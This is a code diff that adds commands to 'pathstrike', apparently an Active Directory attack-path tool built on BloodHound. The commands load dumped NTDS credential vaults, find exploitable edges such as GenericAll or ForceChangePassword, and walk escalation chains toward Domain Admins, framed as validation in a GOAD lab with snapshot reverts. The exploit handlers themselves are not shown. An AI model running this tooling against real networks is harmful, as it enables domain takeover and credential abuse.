@@ -375,6 +375,105 @@ async def _run_revert(cmd: str, settle_seconds: int) -> None:
         await asyncio.sleep(settle_seconds)
 
 
+@app.command(name="test-edge")
+def test_edge(
+    edge_type: Annotated[
+        str,
+        typer.Argument(help="BloodHound edge type to test (e.g. GenericAll). See 'pathstrike edges'."),
+    ],
+    target: Annotated[
+        str,
+        typer.Option("--target", "-t", help="Target principal name, e.g. 'DOMAIN ADMINS@CORP.LOCAL'."),
+    ],
+    source: SourceOption = None,
+    config: ConfigOption = None,
+    live: Annotated[
+        bool,
+        typer.Option("--live", help="Actually execute the exploit. Default is a safe dry-run."),
+    ] = False,
+    force: Annotated[
+        bool,
+        typer.Option("--force", help="Run exploit even if prerequisite checks fail (troubleshooting)."),
+    ] = False,
+    prop: Annotated[
+        Optional[list[str]],
+        typer.Option("--prop", "-p", help="Extra edge property as key=value (repeatable)."),
+    ] = None,
+    source_label: Annotated[
+        str,
+        typer.Option("--source-label", help="Node kind for the source if BH can't resolve it."),
+    ] = "User",
+    target_label: Annotated[
+        str,
+        typer.Option("--target-label", help="Node kind for the target if BH can't resolve it."),
+    ] = "Group",
+    creds_file: Annotated[
+        Optional[Path],
+        typer.Option("--creds-file", help="Bulk credential vault (secretsdump/NTDS dump, hash list, or YAML/JSON) to authenticate as the edge source."),
+    ] = None,
+    output_json: Annotated[
+        bool,
+        typer.Option("--json", help="Emit the structured result as JSON instead of a table."),
+    ] = False,
+    verbose: VerboseOption = False,
+) -> None:
+    """Exercise a SINGLE edge handler against the live environment.
+
+    Resolves [bold]source[/] and [bold]target[/] from BloodHound, builds one
+    [bold]EdgeInfo[/], then runs the handler's [bold]check_prerequisites[/] and
+    [bold]exploit[/] — exactly what the orchestrator does per step, but for one
+    edge in isolation.  This is the tight loop for validating edge coverage
+    against GOAD: restore a snapshot, run [bold]test-edge[/], read the result,
+    restore again.
+
+    Defaults to [bold]dry-run[/]; pass [bold]--live[/] to actually exploit.
+    Use [bold]--json[/] for machine-readable output, or [bold]test-edges[/] to
+    batch many edges from a plan file.
+
+    [bold]Examples[/]:
+      pathstrike test-edge GenericAll -t 'DOMAIN ADMINS@CORP.LOCAL'
+      pathstrike test-edge ForceChangePassword -s 'JDOE@CORP.LOCAL' -t 'VICTIM@CORP.LOCAL' --live
+      pathstrike test-edge RestorableFrom -t 'OLDSVC@CORP.LOCAL' -p deleted_dn='CN=...' --live
+    """
+    setup_logging(verbose=verbose)
+    cfg = _load_config_or_exit(config)
+
+    from pathstrike.engine.edge_tester import execute_edge_test
+
+    # Parse --prop key=value pairs into the edge property dict.
+    edge_props: dict[str, str] = {}
+    for item in prop or []:
+        if "=" not in item:
+            console.print(f"[bold red]Invalid --prop (expected key=value):[/] {item}")
+            raise typer.Exit(code=1)
+        key, value = item.split("=", 1)
+        edge_props[key.strip()] = value
+
+    async def _run() -> dict:
+        cred_store = _seed_credential_store(cfg, extra_vault=creds_file)
+        async with BloodHoundClient.connect(cfg.bloodhound) as client:
+            return await execute_edge_test(
+                cfg, client, cred_store,
+                edge_type=edge_type, target=target, source=source,
+                live=live, force=force, props=edge_props,
+                source_label=source_label, target_label=target_label,
+            )
+
+    try:
+        result = asyncio.run(_run())
+    except Exception as exc:
+        console.print(f"[bold red]Error:[/] {exc}")
+        raise typer.Exit(code=1) from exc
+
+    if output_json:
+        import json
+        console.print_json(json.dumps(result))
+    else:
+        _render_edge_result(result, verbose=verbose)
+
+    raise typer.Exit(code=_OUTCOME_EXIT.get(result["outcome"], 0))
+
+
 def _template_config() -> PathStrikeConfig:
     """A placeholder config for offline `learn` (no target/creds supplied).
 
@@ -556,6 +655,591 @@ def _render_learn(
             console.print(f"[dim]#   (chain stopped early: {res['error']})[/]")
     if not any_cmds and not steps:
         console.print("[dim]# (no commands emitted)[/]")
+
+
+@app.command(name="test-edges")
+def test_edges(
+    plan: Annotated[
+        Path,
+        typer.Option("--plan", help="YAML/JSON test plan. Scaffold one with 'pathstrike gen-test-plan'."),
+    ],
+    config: ConfigOption = None,
+    output_dir: Annotated[
+        Path,
+        typer.Option("--output", "-o", help="Directory for JSONL + summary logs."),
+    ] = Path("test_results"),
+    update_matrix: Annotated[
+        bool,
+        typer.Option("--update-matrix/--no-update-matrix", help="Write results back into the coverage matrix."),
+    ] = True,
+    matrix_path: Annotated[
+        Path,
+        typer.Option("--matrix", help="Path to the coverage matrix to update."),
+    ] = Path("docs/EDGE_STATUS.md"),
+    creds_file: Annotated[
+        Optional[Path],
+        typer.Option("--creds-file", help="Bulk credential vault to authenticate as each edge's source (overrides config vault_file)."),
+    ] = None,
+    verbose: VerboseOption = False,
+) -> None:
+    """Run a BATCH of edge tests from a plan, log results, and update the matrix.
+
+    For each test in the plan this runs the same prereq+exploit cycle as
+    [bold]test-edge[/], appends a structured record to a timestamped JSONL log,
+    and (by default) updates the Status / Last-tested cells in the coverage
+    matrix.  Tests marked [bold]destructive: true[/] trigger the plan's
+    [bold]revert_cmd[/] snapshot hook beforehand, so the lab is clean each time.
+
+    [bold]Example[/]:
+      pathstrike gen-test-plan plan.yaml --category acl
+      # edit targets in plan.yaml, set revert_cmd, then:
+      pathstrike test-edges --plan plan.yaml
+    """
+    setup_logging(verbose=verbose)
+    cfg = _load_config_or_exit(config)
+
+    from pathstrike.engine.edge_tester import (
+        execute_edge_test,
+        load_test_plan,
+        status_symbol,
+        update_matrix_status,
+    )
+
+    try:
+        plan_data = load_test_plan(plan)
+    except Exception as exc:
+        console.print(f"[bold red]Failed to load plan {plan}:[/] {exc}")
+        raise typer.Exit(code=1) from exc
+
+    tests = plan_data["tests"]
+    revert_cmd = plan_data.get("revert_cmd") or None
+    settle = int(plan_data.get("revert_settle_seconds", 60))
+
+    output_dir.mkdir(parents=True, exist_ok=True)
+    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
+    jsonl_path = output_dir / f"edge_tests_{ts}.jsonl"
+    summary_path = output_dir / f"edge_tests_{ts}.summary.json"
+    date_str = datetime.now(timezone.utc).strftime("%Y-%m-%d")
+
+    console.print(f"[bold]Running {len(tests)} edge test(s)[/] -> [cyan]{jsonl_path}[/]")
+    if revert_cmd:
+        console.print("[dim]Revert hook set; runs before each destructive test.[/]")
+    else:
+        console.print("[yellow]No revert_cmd in plan — destructive tests will NOT reset the lab.[/]")
+    console.print()
+
+    async def _run_all() -> list[dict]:
+        import json
+
+        cred_store = _seed_credential_store(cfg, extra_vault=creds_file)
+        results: list[dict] = []
+        with open(jsonl_path, "w", encoding="utf-8") as fh:
+            async with BloodHoundClient.connect(cfg.bloodhound) as client:
+                for i, t in enumerate(tests, 1):
+                    edge = t["edge"]
+                    if t.get("destructive") and revert_cmd:
+                        await _run_revert(revert_cmd, settle)
+
+                    result = await execute_edge_test(
+                        cfg, client, cred_store,
+                        edge_type=edge,
+                        target=t["target"],
+                        source=t.get("source"),
+                        live=bool(t.get("live", False)),
+                        force=bool(t.get("force", False)),
+                        props=t.get("props") or {},
+                        source_label=t.get("source_label", "User"),
+                        target_label=t.get("target_label", "Group"),
+                    )
+                    fh.write(json.dumps(result) + "\n")
+                    fh.flush()
+                    results.append(result)
+
+                    tag = _OUTCOME_ROW.get(result["outcome"], result["outcome"])
+                    extra = (
+                        f" [dim]({result['error_category']})[/]"
+                        if result["outcome"] == "failed" and result["error_category"]
+                        else ""
+                    )
+                    console.print(
+                        f"[dim]{i}/{len(tests)}[/] {tag} "
+                        f"{result['edge_type']} -> {result['target']['name']}{extra}"
+                    )
+
+                    if update_matrix:
+                        sym = status_symbol(result["outcome"], result["mode"] == "live")
+                        update_matrix_status(matrix_path, edge, sym, date_str)
+        return results
+
+    try:
+        results = asyncio.run(_run_all())
+    except Exception as exc:
+        console.print(f"[bold red]Batch error:[/] {exc}")
+        raise typer.Exit(code=1) from exc
+
+    # ---- Summary ----
+    from collections import Counter
+
+    counts = Counter(r["outcome"] for r in results)
+    summary_table = Table(title="Batch Summary", show_header=True, header_style="bold cyan")
+    summary_table.add_column("Outcome", style="bold")
+    summary_table.add_column("Count", justify="right")
+    for outcome in ("success", "failed", "exception", "prereq_failed", "no_handler"):
+        if counts.get(outcome):
+            summary_table.add_row(_OUTCOME_ROW.get(outcome, outcome), str(counts[outcome]))
+    console.print()
+    console.print(summary_table)
+
+    import json
+
+    summary = {
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+        "plan": str(plan),
+        "total": len(results),
+        "counts": dict(counts),
+        "jsonl_log": str(jsonl_path),
+        "matrix_updated": update_matrix,
+    }
+    summary_path.write_text(json.dumps(summary, indent=2), encoding="utf-8")
+    console.print(f"\n[green]Log:[/] {jsonl_path}\n[green]Summary:[/] {summary_path}")
+    if update_matrix:
+        console.print(f"[green]Matrix updated:[/] {matrix_path}")
+
+
+@app.command(name="gen-test-plan")
+def gen_test_plan(
+    output: Annotated[
+        Path,
+        typer.Argument(help="Path to write the plan (YAML)."),
+    ],
+    category: Annotated[
+        Optional[str],
+        typer.Option("--category", help="Only include edges from this handler module (e.g. acl, adcs, delegation)."),
+    ] = None,
+    live: Annotated[
+        bool,
+        typer.Option("--live", help="Mark all generated tests as live (default: dry-run)."),
+    ] = False,
+) -> None:
+    """Scaffold a [bold]test-edges[/] plan seeded from the edge registry.
+
+    Writes one stub per registered edge (optionally filtered to a single
+    handler module via [bold]--category[/]).  Edit the ``target`` (and
+    ``source``/``props``/``destructive``) fields and set ``revert_cmd``, then
+    run [bold]pathstrike test-edges --plan <file>[/].
+    """
+    import yaml
+
+    from pathstrike.engine.edge_registry import get_registry
+
+    rows = sorted(
+        get_registry().items(),
+        key=lambda kv: (kv[1].__module__, kv[0]),
+    )
+    tests: list[dict] = []
+    for edge_type, cls in rows:
+        module = cls.__module__.split(".")[-1]
+        if category and module != category:
+            continue
+        tests.append({
+            "edge": edge_type,
+            "target": "REPLACE_ME@DOMAIN.LOCAL",
+            "source": None,
+            "live": live,
+            "destructive": False,
+            "props": {},
+        })
+
+    if not tests:
+        console.print(
+            f"[yellow]No edges matched category '{category}'.[/] "
+            "Run 'pathstrike edges' to see modules."
+        )
+        raise typer.Exit(code=1)
+
+    plan = {
+        "revert_cmd": "",  # e.g. vmrun -T ws revertToSnapshot /path/GOAD.vmx clean && vmrun -T ws start /path/GOAD.vmx nogui
+        "revert_settle_seconds": 60,
+        "tests": tests,
+    }
+    output.write_text(yaml.safe_dump(plan, sort_keys=False, allow_unicode=True), encoding="utf-8")
+    console.print(
+        f"[green]Wrote {len(tests)} test stub(s) to {output}[/]\n"
+        f"[dim]Edit 'target' fields (and 'revert_cmd' for destructive tests), then:\n"
+        f"  pathstrike test-edges --plan {output}[/]"
+    )
+
+
+# Edges that read state or grant access without mutating AD objects — these
+# don't need a snapshot revert before/after, so the generated plan leaves them
+# non-destructive.  Everything else (writes, resets, forging) is destructive.
+_READ_ONLY_EDGES = {
+    "MemberOf", "AdminTo", "HasSession", "CanRDP", "CanPSRemote", "ExecuteDCOM",
+    "ReadLAPSPassword", "ReadGMSAPassword", "DumpSMSAPassword", "SQLAdmin",
+    "Contains", "ClaimSpecialIdentity",
+}
+
+# Traversal / informational edges with no exploit action of their own.  These
+# are excluded from discovery by default: MemberOf especially floods the plan
+# (every principal belongs to several groups) and its handler is a no-op
+# pass-through, so it validates no tool.  Re-include with --include-traversal.
+_NON_ACTIONABLE_EDGES = {"MemberOf", "Contains", "ClaimSpecialIdentity"}
+
+
+@app.command(name="discover-edges")
+def discover_edges(
+    output: Annotated[
+        Path,
+        typer.Argument(help="Path to write the generated test plan (YAML)."),
+    ],
+    config: ConfigOption = None,
+    creds_file: Annotated[
+        Optional[Path],
+        typer.Option("--creds-file", help="Credential vault — discovery enumerates outbound edges for every principal here."),
+    ] = None,
+    live: Annotated[
+        bool,
+        typer.Option("--live", help="Mark generated tests live (default: dry-run)."),
+    ] = False,
+    revert_cmd: Annotated[
+        str,
+        typer.Option("--revert-cmd", help="Snapshot-revert hook to embed in the plan (runs before destructive tests)."),
+    ] = "",
+    include_traversal: Annotated[
+        bool,
+        typer.Option("--include-traversal", help="Include non-actionable traversal edges (MemberOf, Contains) — skipped by default."),
+    ] = False,
+    exclude: Annotated[
+        Optional[list[str]],
+        typer.Option("--exclude", help="Additional edge type(s) to skip (repeatable)."),
+    ] = None,
+    dedup: Annotated[
+        str,
+        typer.Option("--dedup", help="Collapse duplicates by: 'edge-target' (default, one source per right+target), 'edge' (one test per edge type), or 'none' (every source)."),
+    ] = "edge-target",
+    verbose: VerboseOption = False,
+) -> None:
+    """Build a test plan by enumerating EXPLOITABLE edges from held credentials.
+
+    For every principal you have a credential for (config + [bold]--creds-file[/]
+    vault), this queries BloodHound for that principal's outbound handler-backed
+    edges and their concrete targets, then writes a [bold]test-edges[/] plan with
+    real (source -> target) pairs.  This is the "iterate creds -> find every
+    escalation -> test them all" step for a comprehensive validation pass.
+
+    Write edges are marked [bold]destructive: true[/] so the plan's revert hook
+    fires before them; read/access edges are left non-destructive.
+
+    [bold]Example[/]:
+      pathstrike discover-edges plan.yaml --creds-file north.ntds \\
+        --revert-cmd 'cd ~/GOAD && vagrant snapshot restore clean'
+    """
+    setup_logging(verbose=verbose)
+    cfg = _load_config_or_exit(config)
+
+    import yaml
+
+    from pathstrike.bloodhound.cypher import build_outbound_exploitable_edges_query
+
+    cred_store = _seed_credential_store(cfg, extra_vault=creds_file)
+
+    # Unique sAMAccountNames we hold credentials for.
+    principals = sorted({c.username for c in cred_store.all_credentials()})
+    if not principals:
+        console.print("[yellow]No credentials in store — set credentials in config or pass --creds-file.[/]")
+        raise typer.Exit(code=1)
+
+    domain = cfg.domain.name
+    skip_edges = set(exclude or [])
+    if not include_traversal:
+        skip_edges |= _NON_ACTIONABLE_EDGES
+    console.print(f"[bold]Enumerating exploitable edges for {len(principals)} principal(s) in {domain.upper()}...[/]")
+    if skip_edges:
+        console.print(f"[dim]Skipping edge types: {', '.join(sorted(skip_edges))}[/]")
+
+    skipped_total = 0
+
+    async def _discover() -> list[dict]:
+        nonlocal skipped_total
+        seen: set[tuple[str, str, str]] = set()
+        tests: list[dict] = []
+        async with BloodHoundClient.connect(cfg.bloodhound) as client:
+            for sam in principals:
+                source = f"{sam}@{domain}".upper()
+                query, _ = build_outbound_exploitable_edges_query(source)
+                try:
+                    resp = await client.cypher_query(query)
+                except Exception as exc:  # noqa: BLE001
+                    logger_msg = str(exc)
+                    if "404" not in logger_msg and "not found" not in logger_msg.lower():
+                        console.print(f"[dim]  {source}: query failed ({logger_msg[:120]})[/]")
+                    continue
+
+                literals = resp.get("data", {}).get("literals", []) or []
+                count = 0
+                for lit in literals:
+                    if lit.get("key") != "edge_row" or not lit.get("value"):
+                        continue
+                    fields = lit["value"].split("|")
+                    if len(fields) < 3:
+                        continue
+                    edge_type, target_name, target_kind = fields[0], fields[1], fields[2]
+                    if edge_type in skip_edges:
+                        skipped_total += 1
+                        continue
+                    if dedup == "edge":
+                        dedup_key = (edge_type,)
+                    elif dedup == "none":
+                        dedup_key = (source, edge_type, target_name)
+                    else:  # "edge-target" (default)
+                        dedup_key = (edge_type, target_name)
+                    if dedup_key in seen:
+                        continue
+                    seen.add(dedup_key)
+                    tests.append({
+                        "edge": edge_type,
+                        "source": source,
+                        "target": target_name,
+                        "target_label": target_kind or "Base",
+                        "live": live,
+                        "destructive": edge_type not in _READ_ONLY_EDGES,
+                        "props": {},
+                    })
+                    count += 1
+                if count:
+                    console.print(f"[dim]  {source}: {count} edge(s)[/]")
+        return tests
+
+    try:
+        tests = asyncio.run(_discover())
+    except Exception as exc:
+        console.print(f"[bold red]Discovery error:[/] {exc}")
+        raise typer.Exit(code=1) from exc
+
+    if not tests:
+        console.print("[yellow]No exploitable outbound edges found for the held principals.[/]")
+        raise typer.Exit(code=1)
+
+    plan = {"revert_cmd": revert_cmd, "revert_settle_seconds": 60, "tests": tests}
+    output.write_text(yaml.safe_dump(plan, sort_keys=False, allow_unicode=True), encoding="utf-8")
+    skipped_note = f" [dim]({skipped_total} traversal edge(s) skipped)[/]" if skipped_total else ""
+    console.print(
+        f"\n[green]Wrote {len(tests)} discovered edge test(s) to {output}[/]{skipped_note}\n"
+        f"[dim]Review it, then run:  pathstrike test-edges --plan {output}"
+        f"{'' if creds_file is None else f' --creds-file {creds_file}'}[/]"
+    )
+
+
+# Labels that can't authenticate (you can't log in "as a group/OU/GPO").  When a
+# path step's right sits on one of these, the acting identity is the user we
+# currently control (a member), not the node itself.
+_NON_AUTHABLE_LABELS = {"Group", "Domain", "OU", "Container", "GPO"}
+
+
+@app.command(name="validate-paths")
+def validate_paths(
+    config: ConfigOption = None,
+    source: SourceOption = None,
+    creds_file: Annotated[
+        Optional[Path],
+        typer.Option("--creds-file", help="Credential vault so each step can authenticate as the identity it pivots to."),
+    ] = None,
+    live: Annotated[
+        bool,
+        typer.Option("--live", help="Actually execute each step. Default is dry-run."),
+    ] = False,
+    max_targets: Annotated[
+        int,
+        typer.Option("--max-targets", help="Cap how many high-value targets to attempt paths to."),
+    ] = 25,
+    revert_cmd: Annotated[
+        str,
+        typer.Option("--revert-cmd", help="Snapshot-revert hook run BEFORE each path (so every chain starts clean)."),
+    ] = "",
+    output_dir: Annotated[
+        Path,
+        typer.Option("--output", "-o", help="Directory for JSONL + summary logs."),
+    ] = Path("test_results"),
+    verbose: VerboseOption = False,
+) -> None:
+    """Validate ESCALATION CHAINS end-to-end: does a path reach a higher principal?
+
+    Discovers the shortest exploitable path from [bold]source[/] (default: the
+    config foothold) to each high-value target (Domain Admins / Tier Zero), then
+    walks each step live — modelling the identity pivot along the chain (after
+    taking over a user/computer, subsequent steps act as that identity; rights
+    held via a group are exercised as the member we control).
+
+    Unlike [bold]campaign[/], it does NOT abort the whole run at the first broken
+    step — it records exactly which link fails and how far each chain got, then
+    moves to the next path.  That's the data for "do the escalations actually
+    work end-to-end."
+
+    [bold]Example[/]:
+      pathstrike validate-paths --creds-file creds/north.ntds --live \\
+        --revert-cmd 'cd ~/GOAD && vagrant snapshot restore clean'
+    """
+    setup_logging(verbose=verbose)
+    cfg = _load_config_or_exit(config)
+
+    import json
+
+    from pathstrike.bloodhound.cypher import (
+        build_high_value_nodes_query,
+        build_shortest_path_to_target_query,
+    )
+    from pathstrike.bloodhound.parser import parse_cypher_response
+    from pathstrike.engine.edge_tester import execute_edge_test
+
+    cred_store = _seed_credential_store(cfg, extra_vault=creds_file)
+    domain = cfg.domain.name
+    foothold = source or f"{cfg.credentials.username}@{domain}".upper()
+
+    output_dir.mkdir(parents=True, exist_ok=True)
+    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
+    jsonl_path = output_dir / f"path_validation_{ts}.jsonl"
+    summary_path = output_dir / f"path_validation_{ts}.summary.json"
+
+    console.print(f"[bold]Validating escalation chains from {foothold} in {domain.upper()}[/]")
+    console.print(f"[dim]Mode: {'LIVE' if live else 'dry-run'} -> {jsonl_path}[/]\n")
+
+    async def _run() -> list[dict]:
+        path_summaries: list[dict] = []
+        with open(jsonl_path, "w", encoding="utf-8") as fh:
+            async with BloodHoundClient.connect(cfg.bloodhound) as client:
+                # 1. High-value targets
+                hv_query, _ = build_high_value_nodes_query(domain)
+                try:
+                    hv_resp = await client.cypher_query(hv_query)
+                except Exception as exc:
+                    console.print(f"[bold red]High-value target query failed:[/] {exc}")
+                    return []
+                targets = [
+                    lit["value"]
+                    for lit in hv_resp.get("data", {}).get("literals", []) or []
+                    if lit.get("key") == "name" and lit.get("value") and lit["value"] != foothold
+                ]
+                targets = sorted(set(targets))[:max_targets]
+                if not targets:
+                    console.print("[yellow]No high-value targets found in this domain.[/]")
+                    return []
+                console.print(f"[dim]{len(targets)} high-value target(s) to attempt.[/]\n")
+
+                # 2. Per target: shortest path, then walk it
+                for tgt in targets:
+                    pq, _ = build_shortest_path_to_target_query(foothold, tgt)
+                    try:
+                        presp = await client.cypher_query(pq)
+                        paths = parse_cypher_response(presp)
+                    except Exception:
+                        paths = []
+                    if not paths:
+                        console.print(f"[dim]· {tgt}: no exploitable path[/]")
+                        continue
+
+                    path = paths[0]
+                    if revert_cmd and live:
+                        await _run_revert(revert_cmd, 60)
+
+                    current = foothold          # identity we control right now
+                    steps_out: list[dict] = []
+                    action_total = 0
+                    reached = 0
+                    broke_at = None
+
+                    for i, step in enumerate(path.steps):
+                        et = step.edge.edge_type
+                        src_node, tgt_node = step.edge.source, step.edge.target
+
+                        # Traversal hops don't run a tool — they just move context.
+                        if et in _NON_ACTIONABLE_EDGES:
+                            steps_out.append({"index": i, "edge_type": et,
+                                              "target": tgt_node.name, "kind": "traversal"})
+                            continue
+
+                        action_total += 1
+                        # Who/what to pass as the edge source:
+                        #  * GPO source (GPLink/WriteGPLink): the handler abuses
+                        #    the GPO *object* itself (reads its name from the
+                        #    source node), so the real GPO must be preserved —
+                        #    auth falls back to the foothold identity that took
+                        #    control of it in the prior step.
+                        #  * Other non-authable sources (Group/Domain/OU): a
+                        #    right held via the object is exercised as the member
+                        #    we currently control.
+                        #  * User/Computer source: act as that principal.
+                        if src_node.label == "GPO":
+                            acting = src_node.name
+                        elif src_node.label in _NON_AUTHABLE_LABELS:
+                            acting = current
+                        else:
+                            acting = src_node.name
+
+                        res = await execute_edge_test(
+                            cfg, client, cred_store,
+                            edge_type=et, target=tgt_node.name, source=acting,
+                            live=live, props=dict(step.edge.properties or {}),
+                            source_label=src_node.label or "User",
+                            target_label=tgt_node.label or "Base",
+                        )
+                        res["path_target"] = tgt
+                        res["path_step"] = i
+                        res["acting_as"] = acting
+                        fh.write(json.dumps(res) + "\n"); fh.flush()
+                        steps_out.append({"index": i, "edge_type": et, "target": tgt_node.name,
+                                          "acting_as": acting, "outcome": res["outcome"]})
+
+                        if res["outcome"] == "success":
+                            reached += 1
+                            # Pivot: taking over a user/computer makes us that identity.
+                            if tgt_node.label in {"User", "Computer"}:
+                                current = tgt_node.name
+                        else:
+                            broke_at = {"step": i, "edge_type": et, "target": tgt_node.name,
+                                        "outcome": res["outcome"], "error": res.get("error_category"),
+                                        "msg": res.get("result_msg", "")[:160]}
+                            break
+
+                    full = broke_at is None and action_total > 0
+                    summary = {"target": tgt, "source": foothold,
+                               "action_steps": action_total, "succeeded": reached,
+                               "full_success": full, "broke_at": broke_at, "steps": steps_out}
+                    path_summaries.append(summary)
+
+                    # Console line per path
+                    if full:
+                        console.print(f"[bold green]✅ {tgt}[/] — full chain ({reached}/{action_total} steps)")
+                    elif broke_at:
+                        console.print(
+                            f"[bold red]❌ {tgt}[/] — broke at step {broke_at['step']} "
+                            f"[yellow]{broke_at['edge_type']}[/] -> {broke_at['target']} "
+                            f"[dim]({broke_at['outcome']}{'/' + broke_at['error'] if broke_at['error'] else ''})[/] "
+                            f"[dim]· {reached}/{action_total} ok[/]"
+                        )
+                    else:
+                        console.print(f"[dim]· {tgt}: no actionable steps[/]")
+        return path_summaries
+
+    try:
+        summaries = asyncio.run(_run())
+    except Exception as exc:
+        console.print(f"[bold red]Validation error:[/] {exc}")
+        raise typer.Exit(code=1) from exc
+
+    full = sum(1 for s in summaries if s["full_success"])
+    broken = sum(1 for s in summaries if s["broke_at"])
+    console.print(
+        f"\n[bold]Chains: {len(summaries)} attempted · "
+        f"[green]{full} full[/] · [red]{broken} broke[/][/]"
+    )
+    summary_obj = {
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+        "source": foothold, "domain": domain, "mode": "live" if live else "dry_run",
+        "chains_attempted": len(summaries), "chains_full": full, "chains_broken": broken,
+        "paths": summaries,
+    }
+    summary_path.write_text(json.dumps(summary_obj, indent=2), encoding="utf-8")
+    console.print(f"[green]Log:[/] {jsonl_path}\n[green]Summary:[/] {summary_path}")
 
 
 @app.command()
